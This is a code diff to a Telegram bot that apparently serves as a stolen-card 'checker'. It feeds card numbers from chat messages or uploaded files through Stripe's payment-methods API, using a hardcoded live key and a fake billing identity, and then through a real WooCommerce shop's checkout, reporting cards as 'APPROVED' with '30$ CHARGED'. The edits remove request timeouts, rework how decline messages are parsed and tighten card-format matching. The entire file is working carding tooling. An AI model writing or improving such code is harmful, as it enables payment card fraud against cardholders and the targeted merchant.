@@ -883,7 +883,8 @@ async def stripe_check_handler(client: Client, message: Message):
         data = f'type=card&billing_details[name]=Habud+Kus&billing_details[address][city]=Lobe+&billing_details[address][country]=FI&billing_details[address][line1]=Rantakyl%C3%A4nkatu+2&billing_details[address][postal_code]=80160&billing_details[email]=gecodo9246%40mvpmedix.com&billing_details[phone]=013+2635544&card[number]={cc}&card[cvc]={cvc}&card[exp_month]={mnt}&card[exp_year]={yr}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F2e00b582bb%3B+stripe-js-v3%2F2e00b582bb%3B+split-card-element&referrer=https%3A%2F%2Fshop.dairlab.com&time_on_page=427267&client_attribution_metadata[client_session_id]=3f95b03a-1483-4628-9a69-2b624b78f3b5&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51H70VWFJYq0SkRDBdQBb45H4LBKAsA8bzspunFznrztuwSML8mfbiALnUysBGvGfR0Iko3gCZKbzfIVTYmMJuUs500VwwmFMY8&_stripe_account=acct_1H70VWFJYq0SkRDB&_stripe_version=2022-08-01'
 
         try:
-            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
+            # Remove timeout limit
+            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
             op = response.json()
             
             if 'error' in op:
@@ -897,7 +898,7 @@ async def stripe_check_handler(client: Client, message: Message):
                     f"┗━━━━━━━━━━━⊛\n\n"
                     f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{cc}|{mnt}|{yr}|{cvc}</code>\n"
                     f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ Stripe [30$] \n"
-                    f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ {op.get('error', {}).get('message', 'your card has been declined ❌️')}\n\n"
+                    f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ {op.get('error', {}).get('message', 'Unknown error')}\n\n"
                     f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
                     f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
                     f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"
@@ -960,22 +961,30 @@ async def stripe_check_handler(client: Client, message: Message):
 
             data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fshop.dairlab.com%2Fen%2Fcart%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fshop.dairlab.com%2Fen%2Fcheckout-2%2F&wc_order_attribution_session_start_time=2025-07-23+00%3A50%3A36&wc_order_attribution_session_pages=1&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+15%3B+SM-X216B)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F107.0.0.0+Safari%2F537.36&billing_first_name=Habud&billing_last_name=Kus&billing_country=FI&billing_address_1=Rantakyl%C3%A4nkatu+2&billing_address_2=&billing_postcode=80160&billing_city=Lobe+&billing_state=&billing_phone=013+2635544&billing_email=gecodo9246%40mvpmedix.com&shipping_first_name=&shipping_last_name=&shipping_country=FI&shipping_address_1=&shipping_address_2=&shipping_postcode=&shipping_city=&shipping_state=&order_comments=&shipping_method%5B0%5D=free_shipping%3A2&lang=en&payment_method=stripe_cc&stripe_cc_token_key={payment_id}&stripe_cc_payment_intent_key=&terms=on&terms-field=1&woocommerce-process-checkout-nonce=2430687dcb&_wp_http_referer=%2Fen%2F%3Fwc-ajax%3Dupdate_order_review&pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&pys_utm_id=fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined&pys_browser_time=06-07%7CWednesday%7CJuly&pys_landing=https%3A%2F%2Fshop.dairlab.com%2Fen%2Fshop%2F&pys_source=shop.dairlab.com&pys_order_type=normal&last_pys_landing=https%3A%2F%2Fshop.dairlab.com%2Fen%2Fshop%2F&last_pys_source=shop.dairlab.com&last_pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&last_pys_utm_id=fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined'
 
+            # Remove timeout limit
             response = requests.post(
                 'https://shop.dairlab.com/en/',
                 params=params,
                 cookies=cookies,
                 headers=headers,
-                data=data,
-                timeout=30
+                data=data
             )
             
             elapsed = time.time() - start_time
-            response_text = response.text.lower()
+            response_json = response.json()
             brand, bank, country = get_bin_info(cc[:6])
             
-            if 'declined' in response_text:
+            if response_json.get("result") == "failure":
+                # Extract error message from HTML response
+                error_msg = "Unknown error"
+                if "messages" in response_json:
+                    error_html = response_json["messages"]
+                    error_match = re.search(r'<li>(.*?)<\/li>', error_html)
+                    if error_match:
+                        error_msg = error_match.group(1).strip()
+                
                 status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-                result_msg = "your card has been declined ❌️"
+                result_msg = error_msg
             else:
                 status = "APPROVED ✅️"
                 result_msg = "30$ CHARGED ✅️✅️👌"
@@ -996,7 +1005,7 @@ async def stripe_check_handler(client: Client, message: Message):
             )
             
             await proc_msg.edit(result_text, parse_mode=ParseMode.HTML)
-            await log_to_channel(client, "CC", message, cc_details, "Approved" if status == "APPROVED ✅️" else "Declined")
+            await log_to_channel(client, "CC", message, cc_details, status)
             
         except Exception as e:
             elapsed = time.time() - start_time
@@ -1024,8 +1033,7 @@ async def stripe_check_handler(client: Client, message: Message):
         await message.reply(f"❌ Error processing command: {str(e)}")
         if 'proc_msg' in locals():
             await proc_msg.delete()
-
-# Add this handler to your script
+           
 @app.on_message(filters.command("sttxt") & filters.reply)
 async def stripe_txt_check_handler(client: Client, message: Message):
     try:
@@ -1040,7 +1048,7 @@ async def stripe_txt_check_handler(client: Client, message: Message):
             return
 
         # Send initial processing message
-        proc_msg = await message.reply("↯ Processing your file via Stripe [30$ per card], please wait...")
+        proc_msg = await message.reply("↯ Processing your file via Stripe [30$], please wait...")
 
         # Download the file
         file_path = await message.reply_to_message.download()
@@ -1053,7 +1061,7 @@ async def stripe_txt_check_handler(client: Client, message: Message):
         valid_ccs = []
         for line in cc_lines:
             line = line.strip()
-            if re.match(r"\d{13,16}\|\d{2}\|\d{2,4}\|\d{3,4}", line):
+            if re.match(r"\d{16}\|\d{2}\|\d{2,4}\|\d{3}", line):
                 valid_ccs.append(line)
 
         total_ccs = len(valid_ccs)
@@ -1066,7 +1074,6 @@ async def stripe_txt_check_handler(client: Client, message: Message):
         approved = 0
         declined = 0
         error = 0
-        total_spent = 0  # Track total amount spent (30$ per approved card)
         start_time = time.time()
         last_update = time.time()
         
@@ -1077,8 +1084,10 @@ async def stripe_txt_check_handler(client: Client, message: Message):
 
         # Process each CC
         processed = 0
-        for cc in valid_ccs:
+        for cc_details in valid_ccs:
             try:
+                cc, mnt, yr, cvc = cc_details.split("|")
+                
                 # Update progress every 5 seconds
                 current_time = time.time()
                 if current_time - last_update >= 5:
@@ -1086,10 +1095,10 @@ async def stripe_txt_check_handler(client: Client, message: Message):
                     eta = (elapsed / (processed + 1)) * (total_ccs - processed - 1)
                     
                     progress_msg = (
-                        f"↯ Processing your file via Stripe [30$ per card], please wait...\n\n"
+                        f"↯ Processing your file via Stripe [30$], please wait...\n\n"
                         f"✧ Total Cards: {total_ccs}\n"
                         f"✧ Checked: {processed}/{total_ccs}\n"
-                        f"✧ Approved: {approved} ✅ (${approved * 30})\n"
+                        f"✧ Approved: {approved} ✅\n"
                         f"✧ Declined: {declined} ❌\n"
                         f"✧ Errors: {error} ⚠️\n"
                         f"✧ ETA: {eta:.2f}s remaining"
@@ -1098,16 +1107,6 @@ async def stripe_txt_check_handler(client: Client, message: Message):
                     await proc_msg.edit(progress_msg)
                     last_update = current_time
 
-                # Process the CC using Stripe checker logic
-                cc_parts = cc.split("|")
-                if len(cc_parts) < 4:
-                    results.append(f"{cc.ljust(35)}| ERROR ⚠️       | Invalid format")
-                    error += 1
-                    processed += 1
-                    continue
-
-                cc_num, mnt, yr, cvc = cc_parts[:4]
-                
                 # First request to get payment method
                 headers = {
                     'authority': 'api.stripe.com',
@@ -1119,14 +1118,14 @@ async def stripe_txt_check_handler(client: Client, message: Message):
                     'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                 }
 
-                data = f'type=card&billing_details[name]=Habud+Kus&billing_details[address][city]=Lobe+&billing_details[address][country]=FI&billing_details[address][line1]=Rantakyl%C3%A4nkatu+2&billing_details[address][postal_code]=80160&billing_details[email]=gecodo9246%40mvpmedix.com&billing_details[phone]=013+2635544&card[number]={cc_num}&card[cvc]={cvc}&card[exp_month]={mnt}&card[exp_year]={yr}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F2e00b582bb%3B+stripe-js-v3%2F2e00b582bb%3B+split-card-element&referrer=https%3A%2F%2Fshop.dairlab.com&time_on_page=427267&client_attribution_metadata[client_session_id]=3f95b03a-1483-4628-9a69-2b624b78f3b5&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51H70VWFJYq0SkRDBdQBb45H4LBKAsA8bzspunFznrztuwSML8mfbiALnUysBGvGfR0Iko3gCZKbzfIVTYmMJuUs500VwwmFMY8&_stripe_account=acct_1H70VWFJYq0SkRDB&_stripe_version=2022-08-01'
+                data = f'type=card&billing_details[name]=Habud+Kus&billing_details[address][city]=Lobe+&billing_details[address][country]=FI&billing_details[address][line1]=Rantakyl%C3%A4nkatu+2&billing_details[address][postal_code]=80160&billing_details[email]=gecodo9246%40mvpmedix.com&billing_details[phone]=013+2635544&card[number]={cc}&card[cvc]={cvc}&card[exp_month]={mnt}&card[exp_year]={yr}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F2e00b582bb%3B+stripe-js-v3%2F2e00b582bb%3B+split-card-element&referrer=https%3A%2F%2Fshop.dairlab.com&time_on_page=427267&client_attribution_metadata[client_session_id]=3f95b03a-1483-4628-9a69-2b624b78f3b5&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51H70VWFJYq0SkRDBdQBb45H4LBKAsA8bzspunFznrztuwSML8mfbiALnUysBGvGfR0Iko3gCZKbzfIVTYmMJuUs500VwwmFMY8&_stripe_account=acct_1H70VWFJYq0SkRDB&_stripe_version=2022-08-01'
 
-                response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
+                response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
                 op = response.json()
                 
                 if 'error' in op:
                     # Handle error from first request
-                    results.append(f"{cc.ljust(35)}| DECLINED ❌    | {op.get('error', {}).get('message', 'your card has been declined ❌️')}")
+                    results.append(f"{cc_details.ljust(35)}| DECLINED ❌    | {op.get('error', {}).get('message', 'Unknown error')}")
                     declined += 1
                     processed += 1
                     continue
@@ -1186,24 +1185,30 @@ async def stripe_txt_check_handler(client: Client, message: Message):
                     params=params,
                     cookies=cookies,
                     headers=headers,
-                    data=data,
-                    timeout=30
+                    data=data
                 )
                 
-                response_text = response.text.lower()
+                response_json = response.json()
                 
-                if 'declined' in response_text:
-                    results.append(f"{cc.ljust(35)}| DECLINED ❌    | your card has been declined ❌️")
+                if response_json.get("result") == "failure":
+                    # Extract error message from HTML response
+                    error_msg = "Unknown error"
+                    if "messages" in response_json:
+                        error_html = response_json["messages"]
+                        error_match = re.search(r'<li>(.*?)<\/li>', error_html)
+                        if error_match:
+                            error_msg = error_match.group(1).strip()
+                    
+                    results.append(f"{cc_details.ljust(35)}| DECLINED ❌    | {error_msg}")
                     declined += 1
                 else:
-                    results.append(f"{cc.ljust(35)}| APPROVED ✅    | 30$ CHARGED ✅️✅️👌")
+                    results.append(f"{cc_details.ljust(35)}| APPROVED ✅    | 30$ CHARGED")
                     approved += 1
-                    total_spent += 30  # Add $30 for each approved card
-
+                
                 processed += 1
 
             except Exception as e:
-                results.append(f"{cc.ljust(35)}| ERROR ⚠️       | {str(e)}")
+                results.append(f"{cc_details.ljust(35)}| ERROR ⚠️      | {str(e)}")
                 error += 1
                 processed += 1
                 continue
@@ -1220,14 +1225,13 @@ async def stripe_txt_check_handler(client: Client, message: Message):
         # Prepare caption
         caption = (
             f"─────── ⸙ ────────\n"
-            f"↯ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 [30$ per card]\n\n"
+            f"↯ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 𝗥𝗘𝗦𝗨𝗟𝗧𝗦\n\n"
             f"✧ 𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀: {total_ccs}\n"
-            f"✧ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {approved} ✅ (${total_spent})\n"
+            f"✧ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 : Stripe [30$]\n"
+            f"✧ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 : {approved} ✅\n"
             f"✧ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {declined} ❌\n"
             f"✧ 𝗘𝗿𝗿𝗼𝗿𝘀: {error} ⚠️\n"
             f"✧ 𝗧𝗶𝗺𝗲: {elapsed:.2f}s\n\n"
-            f"✧ 𝗧𝗢𝗧𝗔𝗟 𝗔𝗠𝗢𝗨𝗡𝗧 𝗦𝗣𝗘𝗡𝗗𝗘𝗗: ${total_spent}\n"
-            f"✧ (1 APPROVED = 30$)\n\n"
             f"↯ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: @{username}\n"
             f"─────── ⸙ ────────"
         )
@@ -1250,7 +1254,7 @@ async def stripe_txt_check_handler(client: Client, message: Message):
             f"**User:** [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)\n"
             f"**File:** `{message.reply_to_message.document.file_name}`\n"
             f"**Total Cards:** {total_ccs}\n"
-            f"**Approved:** {approved} (${total_spent})\n"
+            f"**Approved:** {approved}\n"
             f"**Declined:** {declined}\n"
             f"**Errors:** {error}\n"
             f"**Time Taken:** {elapsed:.2f}s"
@@ -1258,7 +1262,7 @@ async def stripe_txt_check_handler(client: Client, message: Message):
         await log_to_channel(client, "CC", message, f"File: {message.reply_to_message.document.file_name}", log_text)
 
     except Exception as e:
-        logging.error(f"Stripe mass CC check error: {e}")
+        logging.error(f"Stripe mass check error: {e}")
         await message.reply(f"❌ Error processing file: {str(e)}")
         if 'proc_msg' in locals():
             await proc_msg.delete()
@@ -1266,8 +1270,9 @@ async def stripe_txt_check_handler(client: Client, message: Message):
             os.remove(file_path)
         if 'result_filename' in locals() and os.path.exists(result_filename):
             os.remove(result_filename)
-
+            
 if __name__ == "__main__":
     print("🚀 Combined Bot is running with /ai, /chk and /gen commands...")
     loop = asyncio.get_event_loop()
     loop.run_until_complete(main())
+            
